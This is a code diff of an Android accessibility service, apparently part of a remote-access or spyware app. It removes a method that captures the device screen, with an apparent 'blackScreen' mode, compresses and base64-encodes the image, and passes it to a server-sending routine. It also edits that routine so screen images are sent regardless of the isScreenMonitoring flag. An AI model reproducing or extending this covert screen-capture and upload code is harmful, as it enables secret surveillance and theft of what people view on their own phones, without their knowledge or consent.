@@ -940,58 +940,6 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
-    public void screenShotDevice() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            takeScreenshot(0, getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {
-
-                @Override
-                public void onSuccess(@NonNull ScreenshotResult screenshot) {
-                    new Thread() {
-                        @Override
-                        public void run() {
-                            try {
-                                Bitmap wrapHardwareBuffer = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
-
-                                // Compress the Bitmap to JPEG format with 50% quality
-                                try {
-                                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-                                    assert wrapHardwareBuffer != null;
-                                    deviceWidth = wrapHardwareBuffer.getWidth();
-                                    deviceHeight = wrapHardwareBuffer.getHeight();
-                                    Bitmap scaledBitmap;
-                                    if(blackScreen) {
-                                        Bitmap converImage = changeImageOpacity(wrapHardwareBuffer,1.0f);
-                                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
-                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 20, byteArrayOutputStream);
-                                    } else {
-                                        scaledBitmap = Bitmap.createScaledBitmap(wrapHardwareBuffer, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
-                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, byteArrayOutputStream);
-                                    }
-                                    // Encode the compressed Bitmap to base64
-                                    byte[] compressedBytes = byteArrayOutputStream.toByteArray();
-                                    String base64Image = Base64.encodeToString(compressedBytes, Base64.DEFAULT);
-                                    Log.d("base64:::", "base64Image");
-                                    sendScreenMonitoringData(base64Image);
-                                    byteArrayOutputStream.close();
-                                } catch (IOException e) {
-                                    throw new RuntimeException(e);
-                                }
-
-                            } catch (Exception e){
-                                e.printStackTrace();
-                            }
-                        }
-                    }.start();
-                }
-
-                @Override
-                public void onFailure(int errorCode) {
-
-                }
-            });
-        }
-    }
-
     private void startCapture() {
         int width = deviceWidth;
         int height = deviceHeight;
@@ -1612,12 +1560,11 @@ public class MainAccessibilityService extends AccessibilityService {
 
     //Send Data part
     public void sendScreenMonitoringData(String base64Image) {
-        screenBase64 = base64Image;
         Log.d("base64Image:::", "screenBase64");
         if (Server.getContext() != null) {
-            if(isScreenMonitoring) {
+            // if(isScreenMonitoring) {
                 Server.getContext().sendScreenMonitoring(base64Image);
-            }
+            // }
         }
     }
 
